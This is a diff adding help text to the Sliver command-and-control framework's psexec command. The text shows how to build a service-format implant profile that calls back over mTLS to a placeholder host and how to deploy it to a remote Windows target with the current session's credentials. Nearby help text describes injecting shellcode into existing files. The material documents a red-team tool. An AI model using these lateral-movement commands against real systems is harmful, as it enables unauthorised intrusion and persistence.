@@ -360,6 +360,19 @@ Each command will have the [[.Bold]]--process[[.Normal]] flag defined, which all
 `
 	psExecHelp = `[[.Bold]]Command:[[.Normal]] psexec <target>
 [[.Bold]]About:[[.Normal]] Start a new sliver as a service on a remote target.
+
+This command uploads a Sliver binary generated on the fly from a profile.
+The profile must be created with the [[.Bold]]service[[.Normal]] format, so that the service manager can properly start and stop the binary.
+
+To create such a profile, use the [[.Bold]]new-profile[[.Normal]] command:
+
+new-profile --format service --skip-symbols --mtls a.bc.de --name win-svc64
+
+Once the profile has been created, run the [[.Bold]]psexec[[.Normal]] command:
+
+psexec -d Description -s ServiceName -p win-svc64 TARGET_FQDN
+
+The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows user associated with the current Sliver session.
 `
 	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
 [[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
